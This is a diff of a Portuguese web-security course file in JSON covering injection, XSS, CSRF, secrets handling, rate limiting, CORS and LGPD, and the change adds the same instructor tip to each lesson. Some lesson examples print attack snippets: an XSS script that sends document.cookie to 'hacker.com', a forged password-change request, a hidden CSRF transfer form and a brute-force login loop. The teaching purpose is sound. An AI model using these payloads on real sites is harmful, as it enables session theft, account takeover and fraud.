+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Defesa Baseada em Validação Estrita",
           "body": "Para proteger bancos NoSQL ou sistemas similares, você precisa validar estritamente o tipo de dado que está sendo recebido antes de enviá-lo para a engine de busca. Se uma senha ou ID deve ser sempre uma 'string', você precisa rejeitar ativamente requisições que passem objetos JSON ou arrays nos campos que deveriam ser textos simples.",
-          "code": "// SEGURO: Validando tipos antes da query NoSQL\nif (typeof req.body.senha !== 'string') {\n  return res.status(400).send('Formato de senha inválido');\n}\n// Agora temos certeza de que a senha é apenas um texto inofensivo e não um comando."
+          "code": "// SEGURO: Validando tipos antes da query NoSQL\nif (typeof req.body.senha !== 'string') {\n  return res.status(400).send('Formato de senha inválido');\n}\n// Agora temos certeza de que a senha é apenas um texto inofensivo e não um comando.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1245,12 +1275,14 @@
         {
           "title": "Ameaça Invisível: XSS",
           "body": "O Cross-Site Scripting (XSS) ocorre quando uma aplicação pega um texto malicioso inserido por um usuário e o exibe no navegador de outras pessoas sem a devida limpeza. Isso permite que um atacante injete scripts em JavaScript dentro da página legítima, executando código não autorizado diretamente na máquina das vítimas.",
-          "code": "<!-- VULNERÁVEL: Renderizar comentários do banco diretamente no HTML -->\n<!-- O atacante postou: <script>fetch('hacker.com/?cookie='+document.cookie)</script> -->\n<div class=\"comment-body\">\n  ${comentarioDoUsuario}\n</div>\n<!-- O navegador da vítima executará o script e roubará a sessão -->"
+          "code": "<!-- VULNERÁVEL: Renderizar comentários do banco diretamente no HTML -->\n<!-- O atacante postou: <script>fetch('hacker.com/?cookie='+document.cookie)</script> -->\n<div class=\"comment-body\">\n  ${comentarioDoUsuario}\n</div>\n<!-- O navegador da vítima executará o script e roubará a sessão -->",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Consequências Catastróficas",
           "body": "Através de um ataque de XSS bem sucedido, um invasor pode roubar tokens de sessão, redirecionar o usuário para sites falsos, alterar o conteúdo visual da página (defacement) ou realizar ações no sistema como se fosse a vítima (por exemplo, aprovar transferências ou enviar mensagens em seu nome) tudo isso de forma invisível no navegador.",
-          "code": "// Um script injetado via XSS tem acesso total ao contexto da página e da sessão.\n// Exemplo de payload malicioso injetado:\nvar req = new XMLHttpRequest();\nreq.open('POST', '/mudar-senha', true);\nreq.send('novaSenha=hacked');\n// O atacante altera a senha do usuário sem ele perceber."
+          "code": "// Um script injetado via XSS tem acesso total ao contexto da página e da sessão.\n// Exemplo de payload malicioso injetado:\nvar req = new XMLHttpRequest();\nreq.open('POST', '/mudar-senha', true);\nreq.send('novaSenha=hacked');\n// O atacante altera a senha do usuário sem ele perceber.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1323,12 +1355,14 @@
         {
           "title": "Falsificação de Pedidos (CSRF)",
           "body": "O Cross-Site Request Forgery (CSRF) engana o navegador da vítima para que ele execute ações indesejadas em um sistema onde ela já está autenticada. Como os navegadores enviam os cookies de sessão automaticamente, um site malicioso controlado pelo atacante pode disparar chamadas para o seu banco, usando a sessão aberta e legítima da vítima.",
-          "code": "<!-- Site do atacante (site-mal.com) contém um formulário escondido: -->\n<form action=\"https://seu-banco.com/transferir\" method=\"POST\">\n  <input type=\"hidden\" name=\"valor\" value=\"10000\">\n  <input type=\"hidden\" name=\"destino\" value=\"CONTA_DO_HACKER\">\n</form>\n<!-- Script ativa o form. O navegador anexa os cookies da sessão da vítima sozinhos! -->"
+          "code": "<!-- Site do atacante (site-mal.com) contém um formulário escondido: -->\n<form action=\"https://seu-banco.com/transferir\" method=\"POST\">\n  <input type=\"hidden\" name=\"valor\" value=\"10000\">\n  <input type=\"hidden\" name=\"destino\" value=\"CONTA_DO_HACKER\">\n</form>\n<!-- Script ativa o form. O navegador anexa os cookies da sessão da vítima sozinhos! -->",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Diferença Entre XSS e CSRF",
           "body": "Enquanto o XSS tenta injetar e executar JavaScript dentro do site da própria vítima, o CSRF usa sites de terceiros para forjar requisições em nome do usuário. No CSRF, o atacante não consegue ler as respostas do servidor (devido às políticas do navegador), mas consegue ordenar ações de alteração de estado (como apagar uma conta ou transferir fundos).",
-          "code": "// Resumo:\n// XSS: Hacker injeta código dentro do SEU site para roubar os usuários.\n// CSRF: Hacker usa o site DELE para forçar os usuários a realizarem ações indesejadas no SEU site."
+          "code": "// Resumo:\n// XSS: Hacker injeta código dentro do SEU site para roubar os usuários.\n// CSRF: Hacker usa o site DELE para forçar os usuários a realizarem ações indesejadas no SEU site.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1401,12 +1435,14 @@
         {
           "title": "Neutralizando o XSS (Escape)",
           "body": "A principal defesa contra o XSS é tratar todo dado inserido pelo usuário através de um processo chamado 'Escaping' ou 'Sanitização'. Ele converte caracteres perigosos de HTML (como < e >) nas suas entidades correspondentes (&lt; e &gt;). A maioria dos frameworks modernos de frontend (como React e Angular) já aplica esse escape automaticamente por padrão.",
-          "code": "// Frameworks modernos protegem automaticamente contra XSS\n// No React, chaves {} aplicam o escape seguro convertendo <script> em texto puro\nfunction Comentario({ texto }) {\n  return <div>{texto}</div>;\n}\n// Se 'texto' tiver tags de script, elas serão exibidas visualmente, mas não executadas."
+          "code": "// Frameworks modernos protegem automaticamente contra XSS\n// No React, chaves {} aplicam o escape seguro convertendo <script> em texto puro\nfunction Comentario({ texto }) {\n  return <div>{texto}</div>;\n}\n// Se 'texto' tiver tags de script, elas serão exibidas visualmente, mas não executadas.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Defendendo-se do CSRF",
           "body": "Para bloquear ataques de CSRF, a melhor estratégia contemporânea é o uso de Tokens Anti-CSRF que acompanham formulários, aliados à flag SameSite nos cookies. A diretiva SameSite diz ao navegador para nunca anexar o cookie da sessão caso a requisição venha de um domínio (site) diferente do seu, matando a premissa base do ataque CSRF.",
-          "code": "// Bloqueando CSRF ao configurar o cookie de sessão\nres.cookie('sessao', valor, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict' // O navegador SÓ envia o cookie se a origem for o seu próprio site.\n});"
+          "code": "// Bloqueando CSRF ao configurar o cookie de sessão\nres.cookie('sessao', valor, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict' // O navegador SÓ envia o cookie se a origem for o seu próprio site.\n});",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1479,12 +1515,14 @@
         {
           "title": "O Veneno no Repositório",
           "body": "Uma das falhas mais frequentes e amadoras de segurança é 'commitar' (salvar) chaves secretas de APIs, senhas de bancos de dados ou tokens de acesso diretamente no código-fonte enviado para o GitHub. Existem milhares de robôs automatizados monitorando os repositórios para capturar essas chaves e usá-las para mineração de criptomoedas ou invasões.",
-          "code": "// O crime perfeito para os bots do GitHub\n// NUNCA, jamais coloque credenciais fixas direto no seu arquivo!\nconst stripeSecretKey = 'sk_live_12345abcdefGHIJKLMN';\nconst awsAccessKeyId = 'AKIAIOSFODNN7EXAMPLE';\n// Seu saldo e sua infraestrutura estão agora na mão de criminosos."
+          "code": "// O crime perfeito para os bots do GitHub\n// NUNCA, jamais coloque credenciais fixas direto no seu arquivo!\nconst stripeSecretKey = 'sk_live_12345abcdefGHIJKLMN';\nconst awsAccessKeyId = 'AKIAIOSFODNN7EXAMPLE';\n// Seu saldo e sua infraestrutura estão agora na mão de criminosos.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Histórico Permanente do Git",
           "body": "Se você acidentalmente commitar um segredo, apagá-lo e fizer um novo commit, você continua vulnerável. O Git guarda o histórico completo de todas as alterações já feitas. O segredo apagado continuará visível nos commits antigos. A única solução é revogar e inutilizar a chave comprometida imediatamente no provedor que a gerou (como AWS ou Stripe).",
-          "code": "1. Você commita 'senha123' em db.js.\n2. Você percebe o erro, altera db.js e commita de novo.\n3. O histórico do GitHub ainda guarda a versão 1.\n// Solução segura: acesse seu provedor (AWS, Banco de dados) e invalide 'senha123'."
+          "code": "1. Você commita 'senha123' em db.js.\n2. Você percebe o erro, altera db.js e commita de novo.\n3. O histórico do GitHub ainda guarda a versão 1.\n// Solução segura: acesse seu provedor (AWS, Banco de dados) e invalide 'senha123'.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1557,12 +1595,14 @@
         {
           "title": "A Solução das Variáveis de Ambiente",
           "body": "Para não colocar dados sensíveis no código, a boa prática é usar 'Variáveis de Ambiente'. Elas ficam no sistema operacional do servidor e o seu programa as lê durante a execução. Localmente, utilizamos arquivos especiais chamados .env, que centralizam senhas, mas que são rigorosamente bloqueados para não irem ao repositório git.",
-          "code": "// Arquivo .env local (apenas na sua máquina, NUNCA commitado)\nDB_PASSWORD=senhaMestra321\nAPI_KEY=abcdef12345\n\n// No seu código JavaScript, você as lê dinamicamente\nconst senha = process.env.DB_PASSWORD;"
+          "code": "// Arquivo .env local (apenas na sua máquina, NUNCA commitado)\nDB_PASSWORD=senhaMestra321\nAPI_KEY=abcdef12345\n\n// No seu código JavaScript, você as lê dinamicamente\nconst senha = process.env.DB_PASSWORD;",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Bloqueando o .env com .gitignore",
           "body": "Para garantir que seu arquivo com chaves locais nunca suba para o GitHub, você deve declarar o arquivo `.env` imediatamente dentro de um arquivo `.gitignore` na raiz do projeto. O Git irá ignorar completamente aquele arquivo, protegendo suas senhas e forçando cada desenvolvedor (e o servidor) a configurar seu próprio `.env` localmente.",
-          "code": "// Conteúdo do arquivo .gitignore na raiz do projeto\nnode_modules/\ndist/\n.env       # Fundamental: esconde o arquivo de variáveis do rastreamento do Git\n*.log"
+          "code": "// Conteúdo do arquivo .gitignore na raiz do projeto\nnode_modules/\ndist/\n.env       # Fundamental: esconde o arquivo de variáveis do rastreamento do Git\n*.log",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1635,12 +1675,14 @@
         {
           "title": "Separando Ambientes (Dev vs Prod)",
           "body": "Nunca compartilhe as chaves de produção (que operam dinheiro ou dados reais) com os ambientes de testes, staging ou desenvolvimento local. Cada etapa precisa usar chaves e bancos de dados separados para limitar danos se houver algum vazamento. Se um desenvolvedor for invadido localmente, no máximo perderão dados fictícios de testes.",
-          "code": "// Ambientes distintos requerem chaves distintas no painel da infraestrutura\n// Servidor de Produção: process.env.API_KEY = 'sk_live_123' (dados reais e valiosos)\n// Máquina do Dev: process.env.API_KEY = 'sk_test_456' (areia para brincar)"
+          "code": "// Ambientes distintos requerem chaves distintas no painel da infraestrutura\n// Servidor de Produção: process.env.API_KEY = 'sk_live_123' (dados reais e valiosos)\n// Máquina do Dev: process.env.API_KEY = 'sk_test_456' (areia para brincar)",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Gerenciadores Seguros em Produção",
           "body": "Embora os arquivos `.env` sejam excelentes para a máquina local do desenvolvedor, ambientes de produção de alta escala devem adotar serviços especializados em gestão de segredos (Secret Managers). Ferramentas como o AWS Secrets Manager ou o HashiCorp Vault armazenam senhas criptografadas, controlam acessos e podem rotacionar chaves automaticamente sem precisar alterar o código.",
-          "code": "// Usando um gerenciador de segredos em vez de arquivos estáticos em produção avançada\nconst awsSecrets = require('aws-secrets-manager');\n// A própria máquina busca a chave em tempo de execução e a mantém apenas na memória RAM\nconst dbPassword = await awsSecrets.getSecret('meu-app/db-senha');"
+          "code": "// Usando um gerenciador de segredos em vez de arquivos estáticos em produção avançada\nconst awsSecrets = require('aws-secrets-manager');\n// A própria máquina busca a chave em tempo de execução e a mantém apenas na memória RAM\nconst dbPassword = await awsSecrets.getSecret('meu-app/db-senha');",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1713,12 +1755,14 @@
         {
           "title": "Validação em Duas Camadas",
           "body": "A validação no Front-End (no navegador) melhora a experiência do usuário avisando sobre erros rapidamente, mas não oferece NENHUMA segurança real, pois pode ser burlada desativando o JavaScript ou disparando requisições via ferramentas como o Postman. É mandatório que o Back-End SEMPRE valide novamente todos os dados, desconfiando do Front.",
-          "code": "// Validação apenas no front-end é um castelo de cartas\n// O atacante pula a interface e envia a requisição direta para a API:\nfetch('https://api.site.com/comprar', {\n  method: 'POST',\n  body: JSON.stringify({ item: 'carro', preco: -1000 }) // API sem validação aceita preço negativo!\n});"
+          "code": "// Validação apenas no front-end é um castelo de cartas\n// O atacante pula a interface e envia a requisição direta para a API:\nfetch('https://api.site.com/comprar', {\n  method: 'POST',\n  body: JSON.stringify({ item: 'carro', preco: -1000 }) // API sem validação aceita preço negativo!\n});",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "O Poder do Zod e Bibliotecas de Schema",
           "body": "Para validar corretamente os dados recebidos na API (Back-End), não dependa de 'ifs' soltos pelo código. Use bibliotecas especializadas de checagem de estrutura (Schema Validation), como Zod, Joi ou Yup. Elas garantem rigor nos tipos, limites, formatos (como e-mails) e removem campos não mapeados que o atacante possa tentar enviar maliciosamente.",
-          "code": "// Validação robusta de Back-End usando Zod\nconst z = require('zod');\nconst UsuarioSchema = z.object({\n  idade: z.number().min(18).max(120),\n  email: z.string().email(),\n});\n// Falha imediatamente se os dados não baterem perfeitamente com a regra acima\nconst dadosSeguros = UsuarioSchema.parse(req.body);"
+          "code": "// Validação robusta de Back-End usando Zod\nconst z = require('zod');\nconst UsuarioSchema = z.object({\n  idade: z.number().min(18).max(120),\n  email: z.string().email(),\n});\n// Falha imediatamente se os dados não baterem perfeitamente com a regra acima\nconst dadosSeguros = UsuarioSchema.parse(req.body);",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1791,12 +1835,14 @@
         {
           "title": "Ataques de Força Bruta",
           "body": "Atacantes utilizam listas imensas de senhas vazadas e robôs rápidos para tentar adivinhar logins em milhões de contas, um processo chamado 'Força Bruta' (Brute Force) ou 'Credential Stuffing'. Se a sua API não limitar o ritmo ou a quantidade das chamadas repetidas, o atacante poderá tentar 10 mil senhas por segundo até descobrir a certa.",
-          "code": "// Ataque de Força Bruta simples e devastador sem proteções:\nfor (let senha of dicionarioDeSenhasComuns) {\n  const sucesso = await tentarLogin('alvo@email.com', senha);\n  if (sucesso) break; // Invasão concluída!\n}"
+          "code": "// Ataque de Força Bruta simples e devastador sem proteções:\nfor (let senha of dicionarioDeSenhasComuns) {\n  const sucesso = await tentarLogin('alvo@email.com', senha);\n  if (sucesso) break; // Invasão concluída!\n}",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Rate Limiting como Defesa",
           "body": "Para evitar esgotamento de recursos e invasões por tentativas insistentes, aplique Rate Limiting (limite de taxa) no Back-End. Ele bloqueia o endereço IP do usuário (ou a conta) por alguns minutos após ultrapassar um limite razoável de tentativas de login ou de requisições gerais à API, barrando scripts automatizados sem afetar clientes humanos.",
-          "code": "// Usando express-rate-limit para proteger rotas sensíveis\nconst rateLimit = require('express-rate-limit');\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // Janela de 15 minutos\n  max: 5, // Limite de 5 tentativas de requisição por IP\n  message: 'Muitas tentativas de login. Tente novamente mais tarde.'\n});\napp.use('/login', limiter);"
+          "code": "// Usando express-rate-limit para proteger rotas sensíveis\nconst rateLimit = require('express-rate-limit');\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // Janela de 15 minutos\n  max: 5, // Limite de 5 tentativas de requisição por IP\n  message: 'Muitas tentativas de login. Tente novamente mais tarde.'\n});\napp.use('/login', limiter);",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1869,12 +1915,14 @@
         {
           "title": "O que é CORS e Políticas do Navegador",
           "body": "O CORS (Cross-Origin Resource Sharing) é uma proteção embutida nos navegadores da web. Por padrão, um site rodando em 'A.com' não tem permissão para fazer requisições via JavaScript (como fetch) para uma API em 'B.com'. O CORS força o servidor B a declarar de forma explícita quais outras origens (sites) têm autorização de consumir seus dados diretamente.",
-          "code": "// O navegador bloqueia a chamada se a API não retornar os cabeçalhos CORS certos.\n// Erro clássico no console:\n// \"Access to fetch at 'api.exemplo.com' from origin 'meusite.com' has been blocked by CORS policy\""
+          "code": "// O navegador bloqueia a chamada se a API não retornar os cabeçalhos CORS certos.\n// Erro clássico no console:\n// \"Access to fetch at 'api.exemplo.com' from origin 'meusite.com' has been blocked by CORS policy\"",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Configurando o CORS com Cuidado",
           "body": "Ao construir a sua API, não ceda à tentação preguiçosa de usar um curinga '*' (permitindo qualquer site do mundo). Configure o CORS especificamente com uma lista branca contendo apenas os domínios do seu frontend oficial. Um CORS aberto permite que sites maliciosos interajam abertamente com os seus serviços e leiam as respostas geradas.",
-          "code": "// Configuração segura de CORS numa API Node.js (Express)\nconst cors = require('cors');\nconst corsOptions = {\n  origin: ['https://meusiteoficial.com', 'https://admin.meusite.com'],\n  optionsSuccessStatus: 200\n};\napp.use(cors(corsOptions)); // Apenas esses dois domínios podem acessar a API pelo navegador."
+          "code": "// Configuração segura de CORS numa API Node.js (Express)\nconst cors = require('cors');\nconst corsOptions = {\n  origin: ['https://meusiteoficial.com', 'https://admin.meusite.com'],\n  optionsSuccessStatus: 200\n};\napp.use(cors(corsOptions)); // Apenas esses dois domínios podem acessar a API pelo navegador.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -1947,12 +1995,14 @@
         {
           "title": "A Definição de Dado Pessoal",
           "body": "A Lei Geral de Proteção de Dados (LGPD) considera como Dado Pessoal qualquer informação que, isolada ou cruzada com outras, possa identificar um indivíduo vivo. Isso não cobre apenas nome e CPF, mas abrange endereços de IP, geolocalização do GPS do celular, cookies de rastreamento de anúncios, histórico de compras e características físicas.",
-          "code": "// Exemplo de conjunto de dados pessoais sob rigorosa proteção legal:\nconst usuario = {\n  nome: 'Maria Silva', // Identificador direto\n  ip: '192.168.1.15', // Identificador indireto (digital)\n  localizacao: 'Lat -23.5, Lng -46.6' // Permite triangulação da identidade\n};"
+          "code": "// Exemplo de conjunto de dados pessoais sob rigorosa proteção legal:\nconst usuario = {\n  nome: 'Maria Silva', // Identificador direto\n  ip: '192.168.1.15', // Identificador indireto (digital)\n  localizacao: 'Lat -23.5, Lng -46.6' // Permite triangulação da identidade\n};",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Dados Pessoais Sensíveis",
           "body": "Existe uma categoria especial com regras ainda mais rígidas, chamada Dado Sensível. Inclui informações como religião, orientação sexual, raça, dados de saúde e biometria. O vazamento ou uso discriminatório desses dados pode causar danos gigantescos. Evite a todo custo coletar esses dados, a menos que seja absolutamente obrigatório para seu sistema.",
-          "code": "// Evite coletar campos não essenciais! Cada novo dado armazenado é um risco e custo legal extra.\n// Ruim: perguntar etnia, religião, e dados biométricos num app de delivery.\n// O vazamento desses dados acarreta as maiores multas possíveis."
+          "code": "// Evite coletar campos não essenciais! Cada novo dado armazenado é um risco e custo legal extra.\n// Ruim: perguntar etnia, religião, e dados biométricos num app de delivery.\n// O vazamento desses dados acarreta as maiores multas possíveis.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -2025,12 +2075,14 @@
         {
           "title": "Finalidade, Necessidade e Adequação",
           "body": "A LGPD baseia-se em princípios sólidos: você só pode pedir um dado de um usuário se tiver um propósito transparente e específico (Finalidade), você deve coletar apenas o mínimo possível para realizar a tarefa (Necessidade), e a informação deve ser condizente com a proposta do sistema. A era do 'vamos guardar para o caso de precisar' acabou.",
-          "code": "// Princípio da Necessidade quebrado:\nfunction cadastrarNoBlog(nome, email, cpf, nomeDaMae, tipoSanguineo) { ... }\n// Qual a utilidade de pedir tipo sanguíneo para ler notícias? A coleta é exagerada e fere a lei."
+          "code": "// Princípio da Necessidade quebrado:\nfunction cadastrarNoBlog(nome, email, cpf, nomeDaMae, tipoSanguineo) { ... }\n// Qual a utilidade de pedir tipo sanguíneo para ler notícias? A coleta é exagerada e fere a lei.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Transparência Total e Consentimento Livre",
           "body": "A regra agora é informar clareza meridiana aos usuários, via termos legíveis, exatamente por que os dados estão sendo recolhidos e com quem serão compartilhados. Além disso, o consentimento (o famoso 'li e aceito') precisa ser ativo, explícito e opcional. Formulários com caixas de aceitação já marcadas ou textos que escondem as reais intenções violam a lei.",
-          "code": "<!-- Consentimento Válido na LGPD -->\n<label>\n  <input type=\"checkbox\" required>\n  Li os termos de privacidade e concordo livremente com o uso do meu e-mail para envio exclusivo de boletos mensais.\n</label>"
+          "code": "<!-- Consentimento Válido na LGPD -->\n<label>\n  <input type=\"checkbox\" required>\n  Li os termos de privacidade e concordo livremente com o uso do meu e-mail para envio exclusivo de boletos mensais.\n</label>",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -2103,12 +2155,14 @@
         {
           "title": "Os Direitos do Titular",
           "body": "A pessoa natural é a verdadeira dona dos seus próprios dados. As leis modernas dão a ela direitos irrenunciáveis: o usuário pode pedir para saber tudo o que a empresa sabe sobre ele (Acesso), pode exigir correção de cadastros defasados e, fundamentalmente, pode retirar o consentimento e exigir a exclusão imediata e permanente de suas informações.",
-          "code": "// A arquitetura do sistema DEVE prever a funcionalidade de exclusão total\napp.delete('/minha-conta', async (req, res) => {\n  // Não basta 'inativar', é preciso apagar (ou anonimizar completamente) registros pessoais a pedido.\n  await db.users.hardDelete(req.usuarioId);\n});"
+          "code": "// A arquitetura do sistema DEVE prever a funcionalidade de exclusão total\napp.delete('/minha-conta', async (req, res) => {\n  // Não basta 'inativar', é preciso apagar (ou anonimizar completamente) registros pessoais a pedido.\n  await db.users.hardDelete(req.usuarioId);\n});",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Processos de Vazamento (Incidente)",
           "body": "Se o pior acontecer e o sistema vazar, as leis de privacidade estipulam prazos curtos para a notificação imediata à autoridade responsável e aos usuários afetados. Encobrir e esconder incidentes de segurança, como muitas empresas faziam antigamente, agora acarreta no pior agravante criminal e multas astronômicas e paralisantes para as organizações.",
-          "code": "// Ação esperada em caso de vazamento:\n// 1. Conter a falha técnica urgentemente (isolar banco).\n// 2. Notificar usuários com transparência de quais dados vazaram e os riscos.\n// 3. Avisar formalmente a Autoridade Nacional de Proteção de Dados (ANPD)."
+          "code": "// Ação esperada em caso de vazamento:\n// 1. Conter a falha técnica urgentemente (isolar banco).\n// 2. Notificar usuários com transparência de quais dados vazaram e os riscos.\n// 3. Avisar formalmente a Autoridade Nacional de Proteção de Dados (ANPD).",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -2181,12 +2235,14 @@
         {
           "title": "Checagem de Infraestrutura",
           "body": "Antes de ir para a produção, valide a infraestrutura e os alicerces do seu ambiente. Confirme se as chaves e segredos estão em um arquivo .env protegido (fora do Git). Force que toda a aplicação responda obrigatoriamente através do certificado digital HTTPS válido e garanta que o banco de dados tem senhas fortes e portas isoladas da internet pública.",
-          "code": "// Checklist Mental de Infra:\n// [ ] Chaves separadas de produção e dev.\n// [ ] Repositório livre de tokens.\n// [ ] Tráfego forçado sempre pra HTTPS (HSTS).\n// [ ] Banco de dados atrás de Firewall, sem acesso externo."
+          "code": "// Checklist Mental de Infra:\n// [ ] Chaves separadas de produção e dev.\n// [ ] Repositório livre de tokens.\n// [ ] Tráfego forçado sempre pra HTTPS (HSTS).\n// [ ] Banco de dados atrás de Firewall, sem acesso externo.",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Checagem do Código e Logs",
           "body": "O código da aplicação deve passar por um pente-fino: verifique se as senhas estão hasheadas com Bcrypt (jamais texto puro), se há validações no Back-End contra Injection e se as requisições estão sob regras estritas de CORS e limitadas por Rate Limit. Por fim, remova console.logs e tratamentos de erro genéricos que possam vazar estruturas do servidor.",
-          "code": "// Checklist Mental do Código:\n// [ ] Senhas transformadas com Bcrypt+Salt.\n// [ ] Inputs passando por validadores formais como o Zod.\n// [ ] Retorno de erros na API de produção devem ser neutros (ex: 'Erro Interno') e não mostrar o Stack Trace (SQL)."
+          "code": "// Checklist Mental do Código:\n// [ ] Senhas transformadas com Bcrypt+Salt.\n// [ ] Inputs passando por validadores formais como o Zod.\n// [ ] Retorno de erros na API de produção devem ser neutros (ex: 'Erro Interno') e não mostrar o Stack Trace (SQL).",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         }
       ],
       "questions": [
@@ -2259,12 +2315,14 @@
         {
           "title": "Planejamento de Recuperação (DRP)",
           "body": "Desenvolva um 'Disaster Recovery Plan'. Não se pergunte se você será invadido, mas quando. O que a equipe fará se o banco de dados for corrompido ou sequestrado por um Ransomware? É vital manter rotinas automáticas de backups geograficamente isolados e frequentemente testados, para que o sistema possa ser restaurado a partir de um momento seguro sem perda imensa.",
-          "code": "// Uma estratégia robusta de Backups prevê o formato 3-2-1:\n// 3 cópias diferentes dos dados.\n// 2 meios de armazenamento distintos (disco local + disco na nuvem).\n// 1 cópia em local externo e remoto da rede principal, protegido de vírus e infecções (cold storage)."
+          "code": "// Uma estratégia robusta de Backups prevê o formato 3-2-1:\n// 3 cópias diferentes dos dados.\n// 2 meios de armazenamento distintos (disco local + disco na nuvem).\n// 1 cópia em local externo e remoto da rede principal, protegido de vírus e infecções (cold storage).",
+          "tip": "Dica do instrutor: Revise com atenção a leitura e o exemplo de código antes de iniciar os exercícios da fase. Identificar as palavras-chave da teoria tornará a resolução das questões imediata."
         },
         {
           "title": "Testes e Auditorias Frequentes",
           "body": "A segurança de software nunca acaba. Adicione rotinas de testes de segurança, utilize ferramentas que escaneiam as bibliotecas de terceiros do projeto (Node modules) à procura de pacotes desatualizados ou sabotados (npm audit) e, se o orçamento permitir, contrate auditorias de Pentest periódicas para tentar quebrar a sua aplicação e achar buracos cego.",
-          "code": "// Exemplo no fluxo de trabalho via terminal:\n// Rodar rotineiramente checagens contra pacotes públicos conhecidamente frágeis:\nnpm audit --audit-level=high\n// E manter as dependências do projeto sempre nas suas versões originais e mais modernas."
+          "code": "// Exemplo no fluxo de trabalho via terminal:\n// Rodar rotineiramente checagens contra pacotes públicos conhecidamente frágeis:\nnpm audit --audit-level=high\n// E manter as dependências do projeto sempre nas suas versões originais e mais modernas.",
